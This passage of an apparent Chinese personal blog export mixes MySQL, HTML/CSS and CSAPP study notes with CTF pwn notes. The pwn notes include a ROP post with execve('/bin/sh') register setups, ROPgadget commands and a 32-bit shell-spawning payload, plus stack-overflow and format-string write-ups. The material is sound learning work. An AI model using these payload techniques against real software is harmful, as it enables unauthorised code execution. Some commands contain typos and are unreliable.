align="left">极大文本数据</td></tr></tbody></table><h3 id="时间和日期类型"><a href="#时间和日期类型" class="headerlink" title="时间和日期类型"></a>时间和日期类型</h3><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01&#x2F;9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’&#x2F;‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901&#x2F;2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYY-MM-DD hh:mm:ss</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="修改数据表"><a href="#修改数据表" class="headerlink" title="修改数据表"></a>修改数据表</h2><blockquote><p>添加字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 字段名 类型（长度）；</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>修改数据类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 MODIFY 字段名 新数据类型</span><br></pre></td></tr></table></figure><p>修改字段名和字段类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型（长度）[COMMENT 注释][约束]；</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>删除数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name ;    -- 直接删除表，不检查是否存在</span><br><span class="line">或</span><br><span class="line">DROP TABLE [IF EXISTS] table_name;</span><br></pre></td></tr></table></figure></blockquote><h2 id="删除指定表，并重新创建该表"><a href="#删除指定表，并重新创建该表" class="headerlink" title="删除指定表，并重新创建该表"></a>删除指定表，并重新创建该表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUNCAIE TABLE 表名；</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>前端三件套</title>
      <link href="/posts/36656.html"/>
      <url>/posts/36656.html</url>
      
        <content type="html"><![CDATA[<h1 id="html"><a href="#html" class="headerlink" title="html"></a>html</h1><h2 id="基本模式"><a href="#基本模式" class="headerlink" title="基本模式"></a>基本模式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;页面标题(w3cschool.cn)&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;我是第一个标题&lt;/h1&gt;    </span><br><span class="line">    &lt;p&gt;我是第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure><ul><li><code>DOCTYPE</code>声明了文档的类型</li><li><code>&lt;html&gt;</code>标签是 HTML 页面的根元素，该标签的结束标志为<code>&lt;/html&gt;</code></li><li><code>&lt;head&gt;</code>标签包含了文档的元数据（<code>meta</code>），如<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>定义网页编码格式为utf-8。</li><li><code>&lt;title&gt;</code>标签定义文档的标题</li><li><code>&lt;body&gt;</code>标签定义文档的主体，即网页可见的页面内容，该标签的结束标志为<code>&lt;/body&gt;</code></li><li><code>&lt;h1&gt;</code>标签作为一个标题使用，该标签的结束标志为<code>&lt;/h1&gt;</code></li><li><code>&lt;p&gt;</code>标签作为一个段落显示，该标签的结束标志为<code>&lt;/p&gt;</code></li></ul><ul><li><p>HTML 标题（Heading）是通过 <h1> <h6>标签来定义的.</p></li><li><p>HTML 段落是通过标签<code>&lt;p&gt;</code>来定义的</p></li><li><p>HTML 链接是通过标签<code>&lt;a&gt;</code>来定义的</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.w3cschool.cn&quot;&gt;这是一个链接&lt;/a&gt;</span><br></pre></td></tr></table></figure><ul><li>HTML 图像是通过标签<code>&lt;img&gt;</code>来定义的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;logonew2.png&quot; width=&quot;206&quot; height=&quot;36&quot;&gt;</span><br></pre></td></tr></table></figure><p>scr 后面是图片的路径</p><ul><li><p>在 HTML 中我们可以使用<em>元素表示斜体的情况</p></li><li><p>在 HTML 中我们还可以使用<strong>来表示粗体</p><p>style 规定元素的行内样式</p><p>title 描述了元素的额外信息</p></li></ul><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><p><img src="/../images/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/CSS-1.png" alt="CSS-1"></p><p>class 为html元素定义一个或多个类名</p><blockquote><p>在<style>中使用.XXXX表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.city &#123;</span><br><span class="line">  background-color: tomato;</span><br><span class="line">  color: white;</span><br><span class="line">  padding: 10px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>id 定义元素的唯一id</p><blockquote><p><code>id</code> 属性指定 HTML 元素的唯一 ID。 <code>id</code> 属性的值在 HTML 文档中必须是唯一的</p><p>同一个类名可以由多个 HTML 元素使用，而一个 id 名称只能由页面中的一个 HTML 元素使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">#myHeader &#123;</span><br><span class="line">  background-color: lightblue;</span><br><span class="line">  color: black;</span><br><span class="line">  padding: 40px;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 id=&quot;myHeader&quot;&gt;My Header&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="CSS-创建"><a href="#CSS-创建" class="headerlink" title="CSS 创建"></a>CSS 创建</h2><p>使用方式</p><p>优先级：(<strong>内联样式） &gt; （内部样式） &gt;（外部样式） &gt; 浏览器默认样式</strong>)</p><blockquote><ul><li>外部样式表(External style sheet)</li><li>内部样式表(Internal style sheet)</li><li>内联样式(Inline style)</li></ul></blockquote><p>外部样式表</p><blockquote><p>当样式需要应用于很多页面时，外部样式表将是理想的选择。在使用外部样式表的情况下，你可以通过改变一个文件来改变整个站点的外观。每个页面使用 <link> 标签链接到样式表。 <link> 标签在（文档的）头部</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><p>内部样式表</p><p>当单个文档需要特殊的样式时，就应该使用内部样式表。你可以使用 <style> 标签在文档头部定义内部样式表，就像这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">hr &#123;color:sienna;&#125;</span><br><span class="line">p &#123;margin-left:20px;&#125;</span><br><span class="line">body &#123;background-image:url(&quot;images/back40.gif&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><blockquote><ul><li><strong>Margin(外边距)</strong> - 清除边框外的区域，外边距是透明的。</li><li><strong>Border(边框)</strong> - 围绕在内边距和内容外的边框。</li><li><strong>Padding(内边距)</strong> - 清除内容周围的区域，内边距是透明的。</li><li><strong>Content(内容)</strong> - 盒子的内容，显示文本和图像。</li></ul></blockquote><p>元素的宽度与高度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div &#123;</span><br><span class="line">    width: 300px;</span><br><span class="line">    border: 25px solid green;</span><br><span class="line">    padding: 25px;</span><br><span class="line">    margin: 25px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p>更多的细节可以查看网上的菜鸟教程</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rop</title>
      <link href="/posts/3980.html"/>
      <url>/posts/3980.html</url>
      
        <content type="html"><![CDATA[<p>123</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>在栈缓冲区溢出的基础上，利用程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程</p></blockquote><p>一般gadgets的指令时查找RIP寄存器</p><h1 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h1><h2 id="原理：（64位）"><a href="#原理：（64位）" class="headerlink" title="原理：（64位）"></a><strong>原理</strong>：（64位）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br><span class="line">rax 0x3b</span><br><span class="line">rdi &quot;/bin/sh&quot;</span><br><span class="line">rsi  0</span><br><span class="line">rdx  0</span><br><span class="line">syscall_addr</span><br></pre></td></tr></table></figure><p>过程：1.首先找到&#x2F;bin&#x2F;sh,或者找到sh</p><p>​            2.溢出之后，pop rax rdi rsi rdx</p><p>​            3.找到syscall 的地址（这个要找syscall 后面又retn的）</p><p>​            如果没有&#x2F;bin&#x2F;sh的地址</p><p>​            4.先利用syscall 写入&#x2F;bin&#x2F;sh\x00</p><p><strong>注</strong>：不能直接写在栈上，因为栈的位置是随机的</p><p>如何写入：</p><p>在DATA段写入数据</p><p>带align （对齐）的写入完全没有影响</p><p>调用read </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(0 写入的地址 写入的长度)</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001065.png" alt="ra&#39;x"></p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax 0xb</span><br><span class="line">ebx bin_sh_addr</span><br><span class="line">ecx 0</span><br><span class="line">edx 0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>ROP-retsyscall</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：这里找到的指令地址后面同样要带有ret</p><p>32位  read 是3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*32+p32(read_addr)+p32(pop_edx_ecx_ebx)</span><br><span class="line">payload+=p32(0)+p32(bss_addr)+p32(8)</span><br><span class="line">payload+=p32(pop_eax)+p32(11)+p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss_addr)</span><br><span class="line">payload+=p32(int_80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=b&#x27;/bin/sh\x00&#x27;</span><br></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><blockquote><p><strong>原理</strong></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001423.png" alt="csu-1"></p><p>在汇编中会有这样的一段代码</p><p>可以通过这段调用寄存器，在ret的时候</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[第五空间2019 决赛]PWN5题解</title>
      <link href="/posts/6658.html"/>
      <url>/posts/6658.html</url>
      
        <content type="html"><![CDATA[<p>先检查开了什么保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111939100.png" alt="1"></p><p>这里有canary 所以不可以直接栈溢出</p><p>打开ida查看</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111941924.png" alt="2"></p><p>可以看到21行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(buf)</span><br></pre></td></tr></table></figure><p>这里有格式化字符串的漏洞</p><p>函数只需第一个读取的和第二次输入的一致就会执行拿到权限</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111941940.png" alt="3"></p><p>可以看到，aaaa在第十个被解释成格式化字符串</p><blockquote><p>fmtstr_payload函数：</p><p><code>fmtstr_payload</code> 函数会根据提供的偏移量和写入内容，生成一个用于触发格式化字符串漏洞的 payload。这个 payload 在被输出时会利用格式化字符串的特性，动态地将指定的数据写入到指定的地址上</p></blockquote><p>所以可以将第一个从文件中读取的变成我们写入的内容</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111941732.png" alt="4"></p><p>接着运行</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111941475.png" alt="5"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>level0题解</title>
      <link href="/posts/30790.html"/>
      <url>/posts/30790.html</url>
      
        <content type="html"><![CDATA[<p>12</p><p>先查看这个函数开了什么保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957645.png" alt="1"></p><p>什么都没有</p><p>打开ida看看</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957646.png" alt="2"></p><p>主函数没有什么</p><p>点进return的那个函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957647.png" alt="3"></p><p>这里buf只有128，但是读取的不止，可以栈溢出</p><p>在pwndbg中调试</p><p>在读取前面打个断点</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957648.png" alt="4"></p><p>因为buf只有128的位置，这里输入了128个’a‘</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957649.png" alt="5"></p><p>可以看到，栈上已经满了</p><p>可以知道栈的空间大小为128</p><p>返回ida</p><p>按住shift 和F12</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957650.png" alt="6"></p><p>看到了&#x2F;bin&#x2F;sh</p><p>点开</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957651.png" alt="7"></p><p>找到这个提权函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957652.png" alt="8"></p><p>找到位置</p><p>可以开始写脚本了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957653.png" alt="9"></p><p>运行</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111957654.png" alt="10"></p><p>解除</p>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2text </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwndbg i386报错解决</title>
      <link href="/posts/6373.html"/>
      <url>/posts/6373.html</url>
      
        <content type="html"><![CDATA[<p>注：Ubuntu的版本为18.04</p><p>先挂个网址</p><p><a href="https://gugesay.com/archives/1598">https://gugesay.com/archives/1598</a></p><p>按照这里的操作先把两个文件并执行</p><p>如果还是不行就按下述指令来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i  lib64gcc1_10-20200411-0ubuntu1_i386.deb</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000251.png" alt="1"></p><p>输入密码后又报错没关系</p><p>继续输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i  gcc-10-base_10-20200411-0ubuntu1_i386.deb</span><br><span class="line">sudo dpkg -i  lib64gcc1_10-20200411-0ubuntu1_i386.deb</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000252.png" alt="2"></p><p>再输入下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -f instal</span><br><span class="line">git init</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000253.png" alt="3"></p><p>这里出现下面的报错不要紧，输入下面的指令</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000254.png" alt="4"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su //进入管理员模式</span><br><span class="line">apt --fix-broken install</span><br><span class="line">exit //退出管理员模式</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000255.png" alt="5"></p><p>这步完成之后再输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>中间可能会有网络问题导致下载失败，多试几次就好了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000256.png" alt="6"></p><p>出现这样就基本上可以了</p><p>最后输入gdb测试一遍</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112000257.png" alt="7"></p><p>成功！！！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>warmup_csaw_2016题解</title>
      <link href="/posts/928.html"/>
      <url>/posts/928.html</url>
      
        <content type="html"><![CDATA[<p>先查看开了什么保护，什么都没有</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002461.png" alt="1"></p><p>再用ida打开查看</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002462.png" alt="2"></p><p>gets函数是危险函数</p><p>从gets函数开始栈溢出，因为要返回到拿权限的位置，现在去找拿权限的位置</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002463.png" alt="3"></p><p>第一行是引用pwn的函数库</p><p>第二行是连接服务器</p><p>第三行是数据流，因为gets v5的空间大小是64，又因为是64位的程序，所以要加上8位</p><p>计算偏移地址第二种方法：使用gdb-peda</p><blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002464.png" alt="1"></p><p>先输入：pattern creat 200</p><blockquote><p>生成200数据</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002465.png" alt="2"></p><blockquote><p>在输入：</p><p>contin</p><p>把之前生成的数据粘贴上去</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002467.png" alt="3.5"></p><p>找到RBP寄存器</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002468.png" alt="3"></p><p>把后面的字符串复制下来</p><p>输入：pattern offfset XXXXXXXX</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002469.png" alt="i"></p><p>得到了偏移量</p><p>构造playload时，直接与系统调用地址相加就可</p></blockquote><p>第四行是发送数据，进行攻击</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002470.png" alt="5"></p><p>拿到flag</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002471.png" alt="5"></p>]]></content>
      
      
      <categories>
          
          <category> pwn-刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ret2text </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/posts/50687.html"/>
      <url>/posts/50687.html</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="canary保护机制"><a href="#canary保护机制" class="headerlink" title="canary保护机制"></a>canary保护机制</h2><blockquote><p>原理：在函数的入口处，从寄存器中取出一个值存放到栈上，当函数结束时检查这个值是否和存进去的值一致</p></blockquote><p>绕过canary的方法</p><blockquote><p>格式化字符串</p><p>canary爆破</p><p>stack smashing</p><p>劫持_stack_chk_fail</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn-学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>csapp2(第三章)</title>
      <link href="/posts/61796.html"/>
      <url>/posts/61796.html</url>
      
        <content type="html"><![CDATA[<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><blockquote><p>形式：函数，方法，子例程，处理函数等</p></blockquote><h3 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h3><p>栈帧</p><blockquote><p>当x86-64 过程中需要的储存空间超出寄存器的大小时，就在栈上分配空间</p></blockquote><h3 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h3><p>传递参数的顺序</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412111953912.png" alt="数据传输顺序"></p><p>超过6位的地方就用栈</p><h3 id="数组的分配与运用"><a href="#数组的分配与运用" class="headerlink" title="数组的分配与运用"></a>数组的分配与运用</h3><p>指针数组每个单位的大小都位8位</p>]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csapp（第三章）</title>
      <link href="/posts/10395.html"/>
      <url>/posts/10395.html</url>
      
        <content type="html"><![CDATA[<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><h3 id="机器级代码"><a href="#机器级代码" class="headerlink" title="机器级代码"></a>机器级代码</h3><p>计算机系统利用抽象模型产生细节</p><blockquote><p>1.指令集体系结构或指令级架构（它是软硬件之间的“合同”）:定义了处理器状态、指令的格式、指令对状态的影响</p><p>2.使用的内存地址是虚拟地址:机器代码将内存看成一个按字节寻址的数组</p></blockquote><blockquote><p>程序处理器：给出将要执行的下一条指令在内存中的地址</p><p>整数寄存器文件包含16个命名的位置，分别储存64位的值。(可以储存地址或者整数数据)</p><p>条件码寄存器保存着最近算数或逻辑的指令的状态信息。(可用来实现if while函数)</p><p>一组向量寄存器可以储存一个或者多个整数或者浮点数值</p></blockquote><p>操作系统负责管理虚拟地址空间，将虚拟地址翻译成实际处理器中的物理地址</p><h3 id="代码具体"><a href="#代码具体" class="headerlink" title="代码具体"></a>代码具体</h3><p>先创建一个c代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch +“文件名”.c</span><br></pre></td></tr></table></figure><blockquote><p>vim “文件名”.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -Og -S &quot;&quot;//预处理代码，可生成.s后缀的文件</span><br><span class="line">gcc -Og -c &quot;&quot;//编译并汇编代码，可生成.o后缀的文件</span><br><span class="line">objdump -d &quot;&quot;//objdump是一种反汇编程序，反汇编该代码</span><br></pre></td></tr></table></figure></blockquote><p>链接器的任务之一就是为函数找到匹配的可执行代码的位置</p><p>反汇编后</p><blockquote><p>所有以”.”开头的为伪指令，可以忽略</p></blockquote><h3 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h3><p>数据传送指令</p><blockquote><p><em>movb</em>(字节) </p><p><em>movw</em>(字)</p><p><em>movl</em>(双字)</p><p><em>movq</em>(四字)</p><p><em>movabsq</em>(传输绝对的四字)</p></blockquote><p>49:20</p><h3 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h3><p>一个CPU包含了一组16个储存64位值的通用寄存器</p><blockquote><p>以%r 开头的</p></blockquote><p>在指令以寄存器作为目标时，对于生成小于8字节的指令：</p><blockquote><p>生成1字节和2字节数字的指令会保持剩下的字节的不变</p><p>生成4字节数字的指令会把高位4个字节设置位零</p></blockquote><h4 id="操作数指示符"><a href="#操作数指示符" class="headerlink" title="操作数指示符"></a>操作数指示符</h4><p>1.立即数</p><blockquote><p>用来表示常数值</p><p>书写方式为：“$”后面跟着一个标准C表示的整数</p></blockquote><p>2.寄存器</p><blockquote><p>表示某个寄存器的内容</p><p>16寄存器的低位1字节，2字节，4字节，8字节中的一个作为一个操作数，其分别对应8位，16位，32位，64位</p></blockquote><p>3.内存引用</p><blockquote><p>根据计算出来的地址(有效地址)访问一些位置</p><p>当Imm(,ri,s),寻址的位置为:Imm+ri*s</p><blockquote><p>就是括号里三个寻址对象是,第二个和第三个相乘</p></blockquote></blockquote><p>:::::就是汇编语言中寻址的方式:::::</p><h4 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h4><p>X86-64 